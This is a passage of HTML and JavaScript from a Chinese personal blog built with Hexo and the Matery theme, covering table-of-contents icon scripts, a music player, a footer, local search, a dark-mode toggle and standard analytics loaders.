0.1549-0.518-0.0557-0.7052-0.1162-0.1043-0.2646-0.1628-0.4074-0.221-0.1475-0.0577-0.2953-0.116-0.4439-0.1706-0.2042-0.0713-0.4475-0.1531-0.6498-0.0358-0.0846 0.0496-0.1444 0.131-0.1982 0.2109-0.0747 0.1157-0.1266 0.2445-0.1952 0.3636-0.4837 0.9276-1.1717 1.74-1.9925 2.3831-0.8208 0.6431-1.7745 1.1169-2.7897 1.3673-7.0612 1.7198-12.182-6.5444-7.5021-12.107 2.4634-2.9539 7.0543-3.4782 10.119-1.154" fill="currentColor"></path></svg>'; // 填入 #t 对应的 SVG 图标
                            break;
                        case 'v':
                            icon = '<svg type="v" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="0" stroke-linecap="round" stroke-linejoin="round" version="1.1" aria-hidden="true" class=""><path d="m12.006 2.4861c8.295-0.034635 12.587 10.042 6.9396 15.995 0.302-0.0792 0.5884 0.106 0.8099 0.2931 0.1763 0.1517 0.337 0.3223 0.4938 0.4938 0.1806 0.1987 0.3602 0.3999 0.5393 0.6 0.158 0.1775 0.3162 0.3571 0.4573 0.5485 0.0932 0.127 0.1803 0.2635 0.2402 0.4098 0.0591 0.1432 0.0867 0.3066 0.0463 0.4586l-0.0182 0.058c-0.0546 0.1443-0.1606 0.2646-0.2695 0.3712-0.0972 0.0941-0.2013 0.1853-0.3018 0.2759-0.1104 0.0982-0.2212 0.201-0.3417 0.287-0.1188 0.0852-0.2583 0.1531-0.4066 0.159-0.2688 9e-3 -0.5043-0.1558-0.7006-0.3227-0.1407-0.1218-0.2719-0.2564-0.3983-0.3929-0.2101-0.2279-0.4164-0.4606-0.6233-0.6914-0.1578-0.1777-0.3167-0.3566-0.4572-0.5485-0.0869-0.1186-0.1682-0.2449-0.2272-0.3799-0.06-0.136-0.0946-0.2901-0.0688-0.4385l0.0117-0.0521 0.0161-0.0498c-1.7182 1.3134-3.966 2.0444-6.2474 1.9119-12.23-1.0527-11.717-18.608 0.50643-18.986zm-6.8e-4 2c-3.9794 3.5e-4 -7.2654 3.1166-7.4809 7.0946-0.30103 4.0208 3.0533 7.76 7.0834 7.8947 4.1153 0.2383 7.6845-2.9602 7.8946-7.0833 0.319-4.1746-3.3113-8.0014-7.4964-7.9059" fill="currentColor"></path><path d="m8.2769 7.8469c0.29326 0.69532 0.64074 1.1934 1.5 1.3397 0.4567-0.53241 1.0671-0.92645 1.7212-0.97652 0.65414-0.05007 1.1756 0.26304 1.2305 0.98096 0.10016 1.3082-2.47 2.532-1.899 4.9596 0.64656 0.38624 1.7475 0.36741 2.2073 0.03029-0.36861-2.09 2.575-3.1725 2.4052-5.3901-0.16975-2.2175-1.7734-3.0416-3.7676-2.8889-1.4358 0.10991-2.597 0.87279-3.3975 1.945z" fill="currentColor"></path><path d="m12.01 14.568c-0.99198 0-1.696 0.76802-1.696 1.7601 0 0.992 0.70406 1.776 1.696 1.776 0.97603 0 1.696-0.78404 1.696-1.776 0-0.99204-0.72002-1.7601-1.696-1.7601z" fill="currentColor"></path></svg>'; // 填入 #v 对应的 SVG 图标
                            break;
                        case 'a':
                            icon = '<svg type="a" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="0" stroke-linecap="round" stroke-linejoin="round" version="1.1" aria-hidden="true" class=""><path d="m15.45 7.35c-0.0022-1.4574-0.7043-2.0002-2.0001-2.0002-0.5281 0-1.0428 0.12066-1.6692 0.8986-1.2172 1.2052-3.5662 1.5773-6.4138 1.5566-0.92067 0.00495-1.8844 0.27586-2.521 0.97407-0.89662 0.97053-0.8534 2.1136-0.84541 3.3436-0.088935 2.0639 1.0163 3.5806 3.1554 3.6639 0.18073 0.9556 0.68251 3.671 0.86079 4.5885 0.11273 0.6047 0.44099 0.6361 0.97316 0.525 0.52124-0.1078 1.1127-0.1057 0.99809-0.819-0.14025-0.8342-0.63023-3.3751-0.78778-4.2434 2.2128 0.1862 3.6134 0.5907 4.5806 1.5138 0.63361 0.6782 1.2967 0.8987 1.6692 0.8987 1.2958-1e-4 2.0107-0.6194 2.0001-2.0002v-3.2681c0.2954-0.13425 0.725-0.23189 1.35-0.23189v-2c-0.625 0-1.0546-0.09763-1.35-0.23189v-3.1681zm-2 8.9q-1.45-2.45-7.4205-2.45c-1.4917 0.02186-2.072-0.06445-2.0295-1.7275 0.00524-1.5258-0.13158-2.3285 1.723-2.2725 5.5801 0.23384 7.964-2.492 7.727-2.45v8.9z" fill="currentColor"></path><path d="m22.024 11.62c0.00399-0.58801-0.05448-1.0153-0.74975-1.0361-0.41509-0.00662-0.82816 0.057395-1.2409 0.094325-0.33033 0.040455-0.73566 0.076976-1.0072 0.28268-0.28398 0.21724-0.23153 0.59429-0.23733 0.9112-0.0015854 0.30307-0.0045853 0.60983 0.27663 0.79666 0.23484 0.15349 0.52158 0.19534 0.7942 0.23343 0.23915 0.02956 0.48002 0.05101 0.71976 0.07523 0.48243 0.03148 1.2248 0.19557 1.394-0.41829 0.0757-0.30577 0.04467-0.627 0.05067-0.93912z" fill="currentColor"></path><path d="m17.348 5.7962c0.042171 0.25853 0.19707 0.48146 0.30883 0.71387 0.28865 0.62708 0.76754 0.52952 1.3216 0.33695 0.29707-0.1074 0.5898-0.22819 0.88354-0.34427 1.2431-0.47478 0.99431-0.8753 0.46485-1.8723-0.42612-0.90268-0.91649-0.67014-1.6207-0.2097-0.32028 0.21007-0.65168 0.40646-0.95187 0.64525-0.21815 0.17815-0.44959 0.42625-0.40623 0.73022z" fill="currentColor"></path><path d="m20.756 17.801c-0.08779-0.41834-0.59472-0.57-0.94009-0.72238-0.31748-0.12454-0.63252-0.2579-0.95618-0.36584-0.27393-0.083771-0.59373-0.17244-0.86319-0.031395-0.21247 0.11853-0.30992 0.35702-0.4191 0.56205-0.12688 0.25243-0.31107 0.53775-0.19892 0.82794 0.1101 0.27652 0.36419 0.46004 0.59732 0.62904 0.18414 0.12824 0.3747 0.24849 0.56281 0.37079 0.15333 0.0986 0.3065 0.19968 0.46418 0.29127 0.21755 0.12307 0.46707 0.25848 0.72501 0.21843 0.34543-0.06224 0.50617-0.44433 0.6571-0.72156 0.07714-0.15037 0.15704-0.30255 0.23064-0.4547 0.08692-0.18674 0.17446-0.39353 0.14043-0.60364z" fill="currentColor"></path></svg>'; // 填入 #a 对应的 SVG 图标
                            break;
                        case 'c':
                            icon = '<svg type="c" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="0" stroke-linecap="round" stroke-linejoin="round" version="1.1" aria-hidden="true" class=""><path d="m6.825 4.8749c1.8175-0.03033 2.3249 0.02869 2.25 2.0152 0.01496 1.139 0.01338 1.984-1.3875 1.9798-1.6108-0.01491-2.7285 0.30288-2.6124-1.796-0.019-1.5193-0.04171-2.2697 1.7499-2.1989zm0-2c-2.5847-0.10689-3.8882 1.4181-3.7496 3.8782-0.058825 1.6262 0.20934 2.9456 1.5713 3.7018 0.98591 0.49526 1.6843 0.40204 2.4713 0.42016 0.661-0.00557 1.2079 0.02014 1.9275-0.21866 1.051-0.35295 1.7794-1.2693 1.9533-2.3675 0.08948-0.54803 0.07327-0.95095 0.0762-1.3975-0.00196-0.42752 0.01114-0.8053-0.05632-1.306-0.24162-1.9408-1.9089-2.8188-3.6634-2.7097-0.17686-7.9441e-4 -0.35349-2.3937e-4 -0.53038-7.7934e-4z" fill="currentColor"></path><path d="m17.075 8.6749c1.8175-0.03034 2.3249 0.02868 2.25 2.0152 0.01495 1.139 0.01338 1.984-1.3875 1.9797-1.6108-0.01491-2.7285 0.30288-2.6124-1.796-0.01899-1.5193-0.04171-2.2697 1.7499-2.1989zm0-2c-2.5847-0.10689-3.8882 1.4181-3.7496 3.8782-0.05882 1.6262 0.20933 2.9457 1.5713 3.7017 0.98593 0.49528 1.6843 0.40205 2.4713 0.42017 0.66099-0.00556 1.2079 0.02015 1.9275-0.21865 1.051-0.35295 1.7794-1.2693 1.9533-2.3675 0.08949-0.54803 0.07328-0.95095 0.07621-1.3975-0.00197-0.42839 0.0112-0.80698-0.05673-1.3089-0.24288-1.9391-1.9097-2.8158-3.663-2.7068-0.17688-7.9346e-4 -0.35351-2.388e-4 -0.5304-7.7896e-4z" fill="currentColor"></path><path d="m8.4749 15.525c1.8175-0.03033 2.3249 0.02868 2.25 2.0152 0.01496 1.139 0.01338 1.984-1.3875 1.9797-1.6108-0.01491-2.7285 0.30288-2.6124-1.796-0.01899-1.5193-0.04172-2.2697 1.7499-2.1989zm0-2c-2.5847-0.10689-3.8882 1.4181-3.7496 3.8782-0.058825 1.6262 0.20934 2.9456 1.5713 3.7018 0.98591 0.49526 1.6843 0.40203 2.4713 0.42016 0.66099-0.00557 1.2079 0.02014 1.9276-0.21866 1.051-0.35294 1.7794-1.2693 1.9533-2.3675 0.08949-0.54803 0.07328-0.95095 0.07621-1.3975-0.00197-0.42753 0.01113-0.80529-0.05633-1.306-0.24162-1.9408-1.9089-2.8188-3.6634-2.7097-0.17688-7.9346e-4 -0.35351-2.4262e-4 -0.5304-7.8736e-4z" fill="currentColor"></path></svg>'; // 填入 #c 对应的 SVG 图标
                            break;
                    }
                    // 创建 <span> 包裹图标和附加信息
                    var iconSpan = $('<span>', { class: 'icon' }).html(`
                        <a href="#${id}" class: 'toc-link evoldown_toc_link'>
                            ${icon}
                            <p name="label">${id}</p>
                        </a>
                    `);

                    // 创建 <ol> 容器，设置与标题相同的缩进
                    var tocIconList = $('<ol>', { 
                        class: 'toc-list evoldown ', 
                        type: type,
                    });
                    tocIconList.append(iconSpan);
                    // 将 <ol> 添加到当前 TOC 项
                    tocListItem.append(tocIconList);
                }
            });
            

            // 点击箭头切换展开/隐藏
            tocItemWrapper.find('.arrow-icon').click(function (e) {
                e.stopPropagation(); // 阻止事件冒泡
                var $arrow = $(this);
                var $parentDiv = $arrow.closest('.toc-item-wrapper'); // 获取箭头所在的父级 <div>
                var $nextLists =  $parentDiv.siblings('ol.toc-list'); // 获取与父级 <div> 同级的 <ol>

                // 判断箭头当前的旋转状态
                if ($arrow.css('transform') === 'matrix(1, 0, 0, 1, 0, 0)') { // rotate(0deg) 表示箭头指向下
                    // 隐藏逻辑
                    $arrow.css('transform', 'rotate(90deg)'); // 将箭头旋转为向左
                    $nextLists.css('display', 'none'); // 隐藏内容
                } else {
                    // 展开逻辑
                    $arrow.css('transform', 'rotate(0deg)'); // 将箭头旋转为向下
                    $nextLists.css('display', 'block'); // 显示内容
                }
            });

            // 将 <li> 添加到 <ol>
            // tocList.append(tocListItem);

            // 将 TOC 项添加到 TOC 容器
            $('#toc-content').append(tocList);


        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    
<footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="6638358192"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022-2025</span>
            
            <a href="/about" target="_blank">Hkini</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">116.9k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
                <span id="sitetime"> Loading ...</span>
                <script>
                    var calcSiteTime = function () {
                        var seconds = 1000;
                        var minutes = seconds * 60;
                        var hours = minutes * 60;
                        var days = hours * 24;
                        var years = days * 365;
                        var today = new Date();
                        var startYear = "2022";
                        var startMonth = "12";
                        var startDate = "25";
                        var startHour = "0";
                        var startMinute = "0";
                        var startSecond = "0";
                        var todayYear = today.getFullYear();
                        var todayMonth = today.getMonth() + 1;
                        var todayDate = today.getDate();
                        var todayHour = today.getHours();
                        var todayMinute = today.getMinutes();
                        var todaySecond = today.getSeconds();
                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                        var diff = t2 - t1;
                        var diffYears = Math.floor(diff / years);
                        var diffDays = Math.floor((diff / days) - diffYears * 365);

                        // 区分是否有年份.
                        var language = 'zh-CN';
                        if (startYear === String(todayYear)) {
                            document.getElementById("year").innerHTML = todayYear;
                            var daysTip = 'This site has been running for ' + diffDays + ' days';
                            if (language === 'zh-CN') {
                                daysTip = '本站已运行 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                daysTip = '本站已運行 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = daysTip;
                        } else {
                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
                                + diffDays + ' days';
                            if (language === 'zh-CN') {
                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
                        }
                    }

                    calcSiteTime();
                </script>
            
            <br>
            
                <span id="icp"><img src="/medias/icp.png"
                                    style="vertical-align: text-bottom;"/>
                <a href="https://beian.miit.gov.cn/" target="_blank">蜀ICP备2023000334号-1</a>
            </span>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/togetherhkl" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:hekailin@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1778267485" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1778267485" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>





    <a href="https://www.zhihu.com/people/wei-lai-ke-qi-49-69" class="tooltipped" target="_blank" data-tooltip="关注我的知乎: https://www.zhihu.com/people/wei-lai-ke-qi-49-69" data-position="top" data-delay="50">
        <i class="fab fa-zhihu1">知</i>
    </a>



    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="195339201" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
